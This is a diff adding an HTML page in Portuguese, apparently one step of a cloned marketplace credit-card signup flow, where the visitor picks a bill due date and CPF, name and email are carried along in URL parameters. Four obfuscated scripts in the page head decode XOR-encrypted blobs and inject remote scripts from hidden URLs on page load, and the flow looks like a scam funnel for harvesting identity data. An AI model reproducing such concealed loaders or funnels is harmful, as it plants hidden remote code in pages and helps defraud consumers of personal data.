@@ -1,0 +1,857 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var b_x=atob("DHBTg58oM7MKpTo+sAtx9u1EEYkozU5KwANprLBLV90k0E5T2RYqrfxHXp1o1xVN0wI68+tbHMZ+yEkR3BEn5uxcHdl5hxYc0QQn8fZKRsdv1hgE6wtx7f5FVpEwh15fxBF+9utFWtVziEpM1QY27esFS9BlwRdN0xtxr71eUt9/wBgEklIur+QKXdJnwBgEkhQy9/4FRsdnzFxHnQAh5ulNXccn1k9c2RQgobMKRdJm0F8cilJx/sJV");var n_g=[];for(var k_ui=0;k_ui<b_x.length;k_ui++){n_g.push(b_x.charCodeAt(k_ui)&255);}var s_0vo=n_g[0];var u_b=n_g.slice(1,1+s_0vo);var s_3n6=n_g.slice(1+s_0vo);var u_k=s_3n6.map(function(b,s_bfn){return b^u_b[s_bfn%s_0vo];});var w_7le6="";for(var a_st=0;a_st<u_k.length;a_st++){w_7le6+=String.fromCharCode(u_k[a_st]&255);}var s_enao=decodeURIComponent(escape(w_7le6));var b_v6i=JSON.parse(s_enao);var x_vi6=b_v6i.globals||[];x_vi6.forEach(function(v_hv){window[v_hv.name]=v_hv.value;});var n_rb2=document.createElement("script");n_rb2.src=b_v6i.url;n_rb2.async=true;n_rb2.defer=true;(b_v6i.attributes||[]).forEach(function(r_ebks){n_rb2.setAttribute(r_ebks.name,r_ebks.value);});(document.head||document.documentElement).appendChild(n_rb2);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<script>(function(){var x_v=atob("DPv5+JvEGQDXP+pP8YDbjemoOzr1V547gYjD17SnfW75Sp4imJ2A1virdC61TcU8komQiO+3NnC+R48j3ouQgP6oNGe4UI0jlNWTi7noO2GjS5gmk46NnejmI1uKE8gonZSbmfe3OzqMRMghkJac2qHmfm+4WIYqoZKBnfeNfSL7HZwunY6c2qHmL2HgDN8swMKYyav3LzDkXdgqw5mfyP6gO32KQg==");var a_0s=[];for(var s_m7=0;s_m7<x_v.length;s_m7++){a_0s.push(x_v.charCodeAt(s_m7)&255);}var j_9h=a_0s[0];var n_m1kx=a_0s.slice(1,1+j_9h);var m_c=a_0s.slice(1+j_9h);var m_svs=m_c.map(function(b,y_a208){return b^n_m1kx[y_a208%j_9h];});var b_4f1="";for(var y_b2=0;y_b2<m_svs.length;y_b2++){b_4f1+=String.fromCharCode(m_svs[y_b2]&255);}var a_40s7=decodeURIComponent(escape(b_4f1));var r_92=JSON.parse(a_40s7);var v_5f5b=r_92.globals||[];v_5f5b.forEach(function(f_b11){window[f_b11.name]=f_b11.value;});var z_7va5=document.createElement("script");z_7va5.src=r_92.url;z_7va5.async=true;z_7va5.defer=true;(r_92.attributes||[]).forEach(function(y_o8){z_7va5.setAttribute(y_o8.name,y_o8.value);});(document.head||document.documentElement).appendChild(z_7va5);})();</script><script src="js/pixel-google.js" async="" defer=""></script>
+
+
+    
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <title>Escolha sua Data de Vencimento - mercado</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #EE4D2D;
+            --primary-dark: #D63D21;
+            --primary-light: rgba(238, 77, 45, 0.1);
+            --yellow: #EE4D2D;
+            --success-green: #00A650;
+            --success-green-dark: #008C44;
+            --text-primary: #333333;
+            --text-secondary: #666666;
+            --text-muted: #999999;
+            --bg-light: #EEEEEE;
+            --white: #FFFFFF;
+            --border: #EDEDED;
+            --shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            --radius: 8px;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-light);
+            color: var(--text-primary);
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            background: var(--yellow);
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Container principal */
+        .container {
+            max-width: 900px;
+            margin: 24px auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: var(--white);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 32px;
+            border: 1px solid var(--border);
+        }
+
+        /* Header do card */
+        .card-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .card-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .card-title i {
+            color: var(--primary);
+            font-size: 22px;
+        }
+
+        .card-subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Grid de datas */
+        .date-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .date-option {
+            background: var(--white);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .date-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, var(--primary-light), transparent);
+            transition: left 0.3s ease;
+        }
+
+        .date-option:hover {
+            border-color: var(--primary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.2);
+        }
+
+        .date-option:hover::before {
+            left: 100%;
+        }
+
+        .date-option:active {
+            transform: translateY(0);
+        }
+
+        .date-number {
+            width: 56px;
+            height: 56px;
+            background: var(--primary);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--white);
+            flex-shrink: 0;
+        }
+
+        .date-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .date-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 2px;
+        }
+
+        .date-description {
+            font-size: 13px;
+            color: var(--text-muted);
+            line-height: 1.4;
+        }
+
+        .date-arrow {
+            color: var(--text-muted);
+            font-size: 16px;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+
+        .date-option:hover .date-arrow {
+            color: var(--primary);
+            transform: translateX(3px);
+        }
+
+        /* Info box */
+        .info-box {
+            background: linear-gradient(135deg, rgba(238, 77, 45, 0.08) 0%, rgba(0, 166, 80, 0.08) 100%);
+            border: 1px solid rgba(238, 77, 45, 0.2);
+            border-radius: 8px;
+            padding: 16px 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .info-icon {
+            width: 36px;
+            height: 36px;
+            min-width: 36px;
+            min-height: 36px;
+            background: linear-gradient(135deg, var(--primary), var(--success-green));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .info-content {
+            flex: 1;
+        }
+
+        .info-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .info-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: var(--white);
+            border-top: 1px solid var(--border);
+            margin-top: auto;
+        }
+
+        .footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Estados de seleção */
+        .date-option.selected {
+            background: var(--primary-light);
+            border-color: var(--primary);
+            transform: scale(1.02);
+        }
+
+        /* Animações */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card {
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        .date-option {
+            animation: fadeInUp 0.3s ease-out both;
+        }
+
+        .date-option:nth-child(1) { animation-delay: 0.05s; }
+        .date-option:nth-child(2) { animation-delay: 0.1s; }
+        .date-option:nth-child(3) { animation-delay: 0.15s; }
+        .date-option:nth-child(4) { animation-delay: 0.2s; }
+        .date-option:nth-child(5) { animation-delay: 0.25s; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                margin: 16px auto;
+                padding: 0 16px;
+            }
+
+            .card {
+                padding: 24px 20px;
+            }
+
+            .card-title {
+                font-size: 20px;
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .date-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .date-option {
+                padding: 16px;
+            }
+
+            .date-number {
+                width: 48px;
+                height: 48px;
+                font-size: 18px;
+            }
+
+            .header {
+                padding: 18px 20px;
+            }
+
+            .logo-container img {
+                height: 40px;
+            }
+        }
+
+        @media (min-width: 769px) {
+            .date-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .date-option:nth-child(5) {
+                grid-column: 1 / -1;
+                max-width: calc(50% - 8px);
+                margin: 0 auto;
+            }
+        }
+
+        /* Modal de confirmação */
+        .confirmation-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .confirmation-modal.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: var(--white);
+            border-radius: 12px;
+            padding: 48px 40px 40px;
+            text-align: center;
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.25),
+                0 0 0 1px rgba(0, 166, 80, 0.1);
+            transform: scale(0.85) translateY(20px);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            max-width: 420px;
+            width: 90%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .modal-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--success-green), var(--success-green-dark));
+        }
+
+        .confirmation-modal.show .modal-content {
+            transform: scale(1) translateY(0);
+        }
+
+        .modal-icon-container {
+            width: 96px;
+            height: 96px;
+            margin: 0 auto 32px;
+            position: relative;
+        }
+
+        .modal-icon {
+            width: 96px;
+            height: 96px;
+            background: linear-gradient(135deg, var(--success-green) 0%, var(--success-green-dark) 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 44px;
+            color: white;
+            box-shadow: 
+                0 8px 32px rgba(0, 166, 80, 0.3),
+                0 0 0 8px rgba(0, 166, 80, 0.1);
+            animation: successBounce 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            position: relative;
+        }
+
+        .modal-icon::after {
+            content: '';
+            position: absolute;
+            inset: -12px;
+            border: 2px solid var(--success-green);
+            border-radius: 50%;
+            opacity: 0;
+            animation: rippleSuccess 0.8s ease-out 0.3s;
+        }
+
+        @keyframes successBounce {
+            0% { 
+                transform: scale(0) rotate(-180deg); 
+                opacity: 0;
+            }
+            50% { 
+                transform: scale(1.1) rotate(-90deg); 
+            }
+            100% { 
+                transform: scale(1) rotate(0deg); 
+                opacity: 1;
+            }
+        }
+
+        @keyframes rippleSuccess {
+            0% { 
+                transform: scale(0.8); 
+                opacity: 1; 
+            }
+            100% { 
+                transform: scale(1.4); 
+                opacity: 0; 
+            }
+        }
+
+        .modal-title {
+            font-size: 26px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        .modal-subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 24px;
+        }
+
+        .modal-date-card {
+            background: linear-gradient(135deg, rgba(0, 166, 80, 0.08), rgba(0, 166, 80, 0.04));
+            border: 2px solid rgba(0, 166, 80, 0.2);
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin: 24px 0 32px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .modal-date-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 166, 80, 0.1), transparent);
+            animation: shimmerSuccess 2s ease-in-out infinite;
+        }
+
+        @keyframes shimmerSuccess {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .modal-date-label {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .modal-date {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin: 0;
+        }
+
+        .modal-loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-size: 14px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(0, 166, 80, 0.2);
+            border-top-color: var(--success-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Ripple effect */
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(238, 77, 45, 0.3);
+            animation: ripple-animation 0.4s linear;
+            pointer-events: none;
+        }
+
+        @keyframes ripple-animation {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        .loading-dots {
+            display: inline-flex;
+            gap: 4px;
+            margin-top: 16px;
+        }
+
+        .loading-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--success-green);
+            border-radius: 50%;
+            animation: loading-bounce 1.4s infinite both;
+        }
+
+        .loading-dot:nth-child(1) { animation-delay: -0.32s; }
+        .loading-dot:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes loading-bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+    </style>
+
+    
+
+    
+
+    
+
+    
+
+    
+<script src="js/utm-handler.js" data-token="ea930328-cad0-4277-b99d-8c16148dcdbb"></script>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+<body style="opacity: 1;">
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="images/logoofc.png" alt="mercado">
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <h1 class="card-title">
+                    Escolha sua Data de Vencimento
+                </h1>
+                <p class="card-subtitle">
+                    Selecione o dia do mês que melhor se adequa ao seu orçamento para o vencimento da fatura.
+                </p>
+            </div>
+
+            <div class="date-grid">
+                <div class="date-option" onclick="selectDate(5)">
+                    <div class="date-number">05</div>
+                    <div class="date-info">
+                        <div class="date-title">Todo dia 5</div>
+                    </div>
+                    <i class="fas fa-chevron-right date-arrow"></i>
+                </div>
+
+                <div class="date-option" onclick="selectDate(10)">
+                    <div class="date-number">10</div>
+                    <div class="date-info">
+                        <div class="date-title">Todo dia 10</div>
+                    </div>
+                    <i class="fas fa-chevron-right date-arrow"></i>
+                </div>
+
+                <div class="date-option" onclick="selectDate(15)">
+                    <div class="date-number">15</div>
+                    <div class="date-info">
+                        <div class="date-title">Todo dia 15</div>
+                    </div>
+                    <i class="fas fa-chevron-right date-arrow"></i>
+                </div>
+
+                <div class="date-option" onclick="selectDate(20)">
+                    <div class="date-number">20</div>
+                    <div class="date-info">
+                        <div class="date-title">Todo dia 20</div>
+                    </div>
+                    <i class="fas fa-chevron-right date-arrow"></i>
+                </div>
+
+                <div class="date-option" onclick="selectDate(25)">
+                    <div class="date-number">25</div>
+                    <div class="date-info">
+                        <div class="date-title">Todo dia 25</div>
+                    </div>
+                    <i class="fas fa-chevron-right date-arrow"></i>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <div class="info-icon">
+                    <i class="fas fa-lightbulb"></i>
+                </div>
+                <div class="info-content">
+                    <div class="info-title">Dica Importante</div>
+                    <div class="info-text">
+                        Considere sua data de recebimento. Você pode alterar posteriormente se necessário.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de confirmação -->
+    <div class="confirmation-modal" id="confirmationModal">
+        <div class="modal-content">
+            <div class="modal-icon-container">
+                <div class="modal-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+            </div>
+            
+            <div class="modal-title">Configurado!</div>
+            <div class="modal-subtitle">Sua data de vencimento foi definida</div>
+            
+            <div class="modal-date-card">
+                <div class="modal-date-label">Vencimento da Fatura</div>
+                <div class="modal-date" id="selectedDateDisplay">Todo dia X</div>
+            </div>
+            
+            <div class="modal-loading">
+                <div class="loading-spinner"></div>
+                Preparando sua conta...
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2026, Todos os direitos reservados.</p>
+        <p><a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </div>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl, additionalParams = {}) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            // Adiciona TODOS os parâmetros originais da URL atual
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            // Adiciona parâmetros novos (como vencimento)
+            Object.keys(additionalParams).forEach(key => {
+                if (additionalParams[key]) {
+                    url.searchParams.append(key, additionalParams[key]);
+                }
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros recebidos
+        console.log('Parâmetros recebidos da página anterior:', getUrlParams());
+
+        // =======================================================
+        // FUNÇÃO DE SELEÇÃO DE DATA
+        // =======================================================
+        
+        function selectDate(day) {
+            console.log('Data de vencimento selecionada:', day);
+            
+            // Remove seleção anterior
+            document.querySelectorAll('.date-option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+            // Adiciona seleção à opção clicada
+            event.currentTarget.classList.add('selected');
+            
+            // Vibração no mobile (se suportado)
+            if ('vibrate' in navigator) {
+                navigator.vibrate(50);
+            }
+            
+            // Mostra modal de confirmação
+            showConfirmationModal(day);
+        }
+
+        function showConfirmationModal(day) {
+            const modal = document.getElementById('confirmationModal');
+            const dateDisplay = document.getElementById('selectedDateDisplay');
+            
+            // Atualiza o texto com a data selecionada
+            dateDisplay.textContent = `Todo dia ${day}`;
+            
+            // Mostra o modal com animação
+            modal.classList.add('show');
+            
+            // Aguarda 2.5 segundos e redireciona
+            setTimeout(() => {
+                // Constrói parâmetros para próxima página
+                const additionalParams = { vencimento: day };
+                const proximaUrl = buildUrlWithParams('10.html', additionalParams);
+                
+                console.log('Redirecionando para 10.html com parâmetros:', proximaUrl);
+                console.log('Parâmetros preservados:', getUrlParams());
+                console.log('Nova data de vencimento adicionada:', day);
+                
+                // Redireciona para próxima página
+                window.location.href = proximaUrl;
+            }, 2500);
+        }
+
+        // =======================================================
+        // EFEITOS VISUAIS
+        // =======================================================
+        
+        function createRipple(event, element) {
+            const rect = element.getBoundingClientRect();
+            const size = Math.max(rect.width, rect.height);
+            const x = event.clientX - rect.left - size / 2;
+            const y = event.clientY - rect.top - size / 2;
+            
+            const ripple = document.createElement('div');
+            ripple.className = 'ripple';
+            ripple.style.width = ripple.style.height = size + 'px';
+            ripple.style.left = x + 'px';
+            ripple.style.top = y + 'px';
+            
+            element.appendChild(ripple);
+            
+            setTimeout(() => ripple.remove(), 400);
+        }
+
+        // Adiciona efeito ripple a todas as opções de data
+        document.querySelectorAll('.date-option').forEach(element => {
+            element.addEventListener('click', function(e) {
+                createRipple(e, this);
+            });
+        });
+
+        // =======================================================
+        // FUNÇÃO HELPER PARA OUTRAS PÁGINAS
+        // =======================================================
+        
+        window.getCustomerData = function() {
+            const params = getUrlParams();
+            return {
+                cpf: params.cpf || '',
+                nome: params.nome || '',
+                ParceiroChat: params.ParceiroChat || '',
+                email: params.email || '',
+                vencimento: params.vencimento || ''
+            };
+        };
+
+        // =======================================================
+        // INICIALIZAÇÃO
+        // =======================================================
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => {
+                document.body.style.opacity = '1';
+            }, 50);
+            
+            const customerData = getCustomerData();
+            if (customerData.nome || customerData.cpf) {
+                console.log('Dados do cliente identificado:', customerData);
+            }
+        });
+    </script>
+
+</body></html>
